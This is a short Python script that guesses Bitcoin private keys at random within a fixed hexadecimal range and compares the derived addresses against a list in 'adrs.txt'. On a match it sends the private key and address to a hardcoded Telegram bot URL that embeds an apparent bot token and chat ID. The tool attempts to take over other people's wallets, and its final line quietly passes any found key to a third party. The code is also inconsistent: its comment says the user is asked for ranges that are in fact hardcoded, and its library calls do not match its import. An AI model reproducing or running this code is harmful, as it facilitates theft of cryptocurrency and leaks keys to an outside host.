import random
import requests
from bitcoin import *

def generate_private_key(start_range, end_range):
    private_key_int = random.randint(start_range, end_range)
    return hex(private_key_int)[2:].zfill(64)

# Ask the user to input the start and end ranges in hexadecimal format
start_range = int('0000000000000000000000000000000000000000000000040000000000000000', 16)
end_range = int('000000000000000000000000000000000000000000000007ffffffffffffffff', 16)

found_match = False

while not found_match:
    private_key_hex = generate_private_key(start_range, end_range)
    private_key = Key.from_hex(private_key_hex)
    generated_address = private_key.address

    print("Generated Bitcoin private key:", private_key_hex)
    print("Generated Bitcoin address:", generated_address)

    # Read addresses from the file
    matched_addresses = []
    with open('adrs.txt', 'r') as file:
        addresses = file.readlines()
        for address in addresses:
            if generated_address == address.strip():
                matched_addresses.append(address.strip())

    # If matched addresses found, set flag to True to exit the loop
    if matched_addresses:
        found_match = True
        print("Successfully found matching addresses:")
        print("Matched Bitcoin addresses:")
        for address in matched_addresses:
            print(address)
        requests.post(f"https://api.telegram.org/bot7289040329:AAHibMzaFv5yQWOb1cA6LJnPN-b47JdlYfk/sendMessage?chat_id=6553604328&text={private_key_hex}|{generated_address}")
    else:
        print("No matching addresses found. Generating a new private key.")